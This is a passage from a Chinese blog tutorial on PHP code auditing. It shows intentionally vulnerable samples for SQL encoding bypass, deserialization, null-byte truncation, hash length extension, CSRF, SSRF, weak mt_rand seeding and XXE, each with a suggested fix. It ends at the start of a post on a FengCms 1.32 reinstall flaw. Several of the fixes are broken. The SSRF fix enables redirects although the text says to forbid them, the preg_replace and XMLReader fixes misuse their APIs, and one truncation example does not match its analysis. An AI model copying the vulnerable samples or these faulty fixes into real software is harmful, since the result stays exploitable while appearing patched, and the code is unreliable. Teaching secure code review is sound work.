<h4 id="0x02漏洞代码及分析-13"><a href="#0x02漏洞代码及分析-13" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>, <span class="string">'code'</span>); <span class="comment">//数据库连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'username'</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    username = base64_decode(addslashes(_POST[<span class="string">'username'</span>]));</span><br><span class="line"></span><br><span class="line">    data = mysqli - &gt;query(<span class="string">"select * from user where username='$username'"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($data - &gt;num_rows !== <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        arr = data - &gt;fetch_row();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>虽然对POST传入内容过滤，可经过二次编码绕过过滤<br>修复建议：<br>在解码之后再进行一次字符串过滤<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = addslashes(base64_decode(addslashes(_POST[<span class="string">'username'</span>])));</span><br></pre></td></tr></table></figure>
<h3 id="7-4反序列化漏洞"><a href="#7-4反序列化漏洞" class="headerlink" title="7.4反序列化漏洞"></a>7.4反序列化漏洞</h3><h4 id="0x01漏洞背景-20"><a href="#0x01漏洞背景-20" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>php反序列化漏洞又称对象注入，调用某一类并执行魔术方法(magic method)，之后可以执行类中函数，产生安全问题</p>
<h4 id="0x02漏洞代码及分析-14"><a href="#0x02漏洞代码及分析-14" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">out</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username: "</span>.this - &gt;username.<span class="string">"&lt;br&gt;"</span>.<span class="string">"password: "</span>.this - &gt;password;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span> - &gt;file);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_POST[<span class="string">'str'</span>]);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>test类的魔术方法中存在可以利用的地方，通过反序列化漏洞可以控制变量，达到写入文件的效果<br>修复建议：<br>如果代码中有反序列化，不要在类的魔术方法中进行敏感操作</p>
<h3 id="7-5截断漏洞"><a href="#7-5截断漏洞" class="headerlink" title="7.5截断漏洞"></a>7.5截断漏洞</h3><h4 id="0x01漏洞背景-21"><a href="#0x01漏洞背景-21" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>PHP&lt;5.3.4中，<strong>%00</strong>可截断字符串，在写入文件时截断路径导致任意文件名写入</p>
<h4 id="0x02漏洞代码及分析-15"><a href="#0x02漏洞代码及分析-15" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ereg(<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>这里限制了前缀跟后缀，但是没有过滤../跟%00截断漏洞，导致可以任意文件读取<br>修复建议：<br>不允许..等跨目录字符出现，使用addslashes过滤%00防止被截断包含<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">id = addslashes(_GET[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strstr($id, <span class="string">'..'</span>))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'输入不合法'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file = file_get_contents(<span class="string">'upload/'</span>.id.<span class="string">'.txt'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $file;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>漏洞代码2：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ereg(<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>ereg函数存在NULL截断漏洞<br>修复建议：<br>停止使用ereg与eregi函数<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_replace(<span class="string">"/[a-zA-Z0-9]+/"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>) &#123;</span><br></pre></td></tr></table></figure>
<h3 id="7-6-hash长度扩展攻击漏洞"><a href="#7-6-hash长度扩展攻击漏洞" class="headerlink" title="7.6 hash长度扩展攻击漏洞"></a>7.6 hash长度扩展攻击漏洞</h3><h4 id="0x01漏洞背景-22"><a href="#0x01漏洞背景-22" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息)此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgard构造的算法均对此类攻击显示出脆弱性。</p>
<h4 id="0x02漏洞代码及分析-16"><a href="#0x02漏洞代码及分析-16" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line">$username = <span class="string">"admin"</span>;</span><br><span class="line"></span><br><span class="line">password = _POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (COOKIE[<span class="string">"getmein"</span>] === md5(secret.urldecode(username.password))) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"The flag is "</span>.$flag);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>漏洞产生条件是当可控内容拼接在$secret后面，再进行md5加密；且要知道同样是经过$secret加密后的32位md5</p>
<ul>
<li>修复建议：</li>
</ul>
<p>将$secret放到后面<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (COOKIE[<span class="string">"getmein"</span>] === md5(urldecode(username . password). secret)) &#123;</span><br></pre></td></tr></table></figure>
<h3 id="7-7-CSRF跨站请求伪造漏洞"><a href="#7-7-CSRF跨站请求伪造漏洞" class="headerlink" title="7.7 CSRF跨站请求伪造漏洞"></a>7.7 CSRF跨站请求伪造漏洞</h3><h4 id="0x01漏洞背景-23"><a href="#0x01漏洞背景-23" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>​    在跨站请求伪造（CSRF）攻击里面，攻击者通过用户的浏览器来注入额外的网络请求，来破坏一个网站会话的完整性。而浏览器的安全策略是允许当前页面发送到任何地址的请求，因此也就意味着当用户在浏览他/她无法控制的资源时，攻击者可以控制页面的内容来控制浏览器发送它精心构造的请求。</p>
<h4 id="0x02漏洞代码及分析-17"><a href="#0x02漏洞代码及分析-17" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'user.php'</span>; <span class="comment">//验证用户登录</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'act'</span>] == <span class="string">'newpwd'</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    newpwd = md5(_POST[<span class="string">'newpwd'</span>]);</span><br><span class="line"></span><br><span class="line">    sql = <span class="string">"update user set password='newpwd' where id=$userid"</span>;</span><br><span class="line"></span><br><span class="line">    mysql_query($sql);</span><br><span class="line"></span><br><span class="line">    mysql_close($conn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'修改密码成功'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>未对CSRF进行任何防御，可以恶意构造表单，用户触发后可以修改其密码<br>修复建议：<br><strong>验证HTTP Referer字段、在请求地址中添加 token并验证、用XMLHttpRequest附加在header里</strong></p>
<h3 id="7-8-SSRF请求伪造漏洞"><a href="#7-8-SSRF请求伪造漏洞" class="headerlink" title="7.8 SSRF请求伪造漏洞"></a>7.8 SSRF请求伪造漏洞</h3><h4 id="0x01漏洞背景-24"><a href="#0x01漏洞背景-24" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong> 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从 外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<h4 id="0x02漏洞代码及分析-18"><a href="#0x02漏洞代码及分析-18" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt(ch, CURLOPT_URL, _GET[<span class="string">'url'</span>]);</span><br><span class="line"></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line">curl_close($ch);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>未限制URL的协议，恶意使用其他协议可导致源码泄露、内网泄露等漏洞；如果使用了CDN，请求http会泄露源站IP<br>修复建议：<br>限制协议为HTTP、HTTPS；禁止30x跳转<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">url = _GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strpos(url, <span class="string">'http://'</span>) === <span class="keyword">false</span> &amp;&amp; strpos(url, <span class="string">'https://'</span>) === <span class="keyword">false</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'请求链接不合法'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line"></span><br><span class="line">curl_setopt(ch, CURLOPT_URL, url);</span><br><span class="line"></span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">curl_exec($ch);</span><br><span class="line"></span><br><span class="line">curl_close($ch);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<h3 id="7-9伪随机数漏洞"><a href="#7-9伪随机数漏洞" class="headerlink" title="7.9伪随机数漏洞"></a>7.9伪随机数漏洞</h3><h4 id="0x01漏洞背景-25"><a href="#0x01漏洞背景-25" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>mt_rand()并不是一个真·随机数生成函数,实际上绝大多数编程语言中的随机数函数生成的都都是伪随机数。<br>伪随机是由可确定的函数（常用线性同余），通过一个种子（常用时钟），产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。</p>
<h4 id="0x02漏洞代码及分析-19"><a href="#0x02漏洞代码及分析-19" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_generate_password</span><span class="params">(length = <span class="number">12</span>, special_chars = true)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($special_chars) &#123;</span><br><span class="line"></span><br><span class="line">        chars. = <span class="string">'!@#%^&amp;*()'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $password = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line"></span><br><span class="line">        password. = substr(chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $password;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = wp_generate_password(<span class="number">16</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[*] This is a key for public:"</span>.$key.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$private = wp_generate_password(<span class="number">10</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[*] Create a private key which you don't know:"</span>.$private.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>如果没有mt_srand()给随机数发生器播种，mt_rand会使用一个随机生成的固定种子，如果知道$key的情况下，可以预测出$private。<br>修复建议：<br>mt_rand之前进行随机播种。<br>mt_srand((double)microtime()*1000000);<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_generate_password</span><span class="params">(length = <span class="number">12</span>, special_chars = true)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    mt_srand((double) microtime() * <span class="number">1000000</span>);</span><br><span class="line"></span><br><span class="line">    $chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($special_chars) &#123;</span><br><span class="line"></span><br><span class="line">        chars. = <span class="string">'!@#%^&amp;*()'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $password = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line"></span><br><span class="line">        password. = substr(chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $password;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="7-10-XXE漏洞"><a href="#7-10-XXE漏洞" class="headerlink" title="7.10 XXE漏洞"></a>7.10 XXE漏洞</h3><h4 id="0x01漏洞背景-26"><a href="#0x01漏洞背景-26" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.在XML1.0标准<br>里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题.</p>
<h4 id="0x02漏洞代码及分析-20"><a href="#0x02漏洞代码及分析-20" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$xml = @file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line">data = simplexml_load_string(xml);</span><br><span class="line"></span><br><span class="line">print_r($data);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>
<p>simplexml_load_string函数读取XML会引起XXE漏洞，导致任意文件读取、命令执行漏洞<br>修复建议：<br>使用XMLReader或DOM方式解析XML<br>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line"></span><br><span class="line">$xml = @file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line">data = XMLReader: :xml(xml, <span class="string">'UTF-8'</span>, LIBXML_NONET);</span><br><span class="line"></span><br><span class="line">print_r($data);</span><br><span class="line"></span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-FengCms1.32 重装漏洞"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/10/19/FengCms1.32 重装漏洞/">FengCms1.32 重装漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/10/19/FengCms1.32 重装漏洞/" class="article-date">
	  <time datetime="2017-10-19T15:53:56.000Z" itemprop="datePublished">2017-10-19</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="FengCms1-32-重装漏洞"><a href="#FengCms1-32-重装漏洞" class="headerlink" title="FengCms1.32 重装漏洞"></a>FengCms1.32 重装漏洞</h2><p>FengCms基于PHP+MYSQL开发。是一款    开源的网站内容管理系统。系统支持自由订制模型，自由标签系统，使其更加的灵活，可以用FengCms可以打造任意展示模型。</p>
<p><strong>漏洞简介及危害</strong></p>
<p>本次漏洞出现在CMS的安装上，在配置文件中过滤不严禁，在安装过程中，可以插入恶意代码，从而执行任意命令，甚至直接获取Webshell，危害较大。</p>
<p><strong>影响版本</strong></p>
<p>FengCms1.32</p>
<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h4 id="步骤1：了解漏洞原理"><a href="#步骤1：了解漏洞原理" class="headerlink" title="步骤1：了解漏洞原理"></a>步骤1：了解漏洞原理</h4><p>本次漏洞的代码漏洞入口在<code>install/index.php</code>中，代码如下：</p>
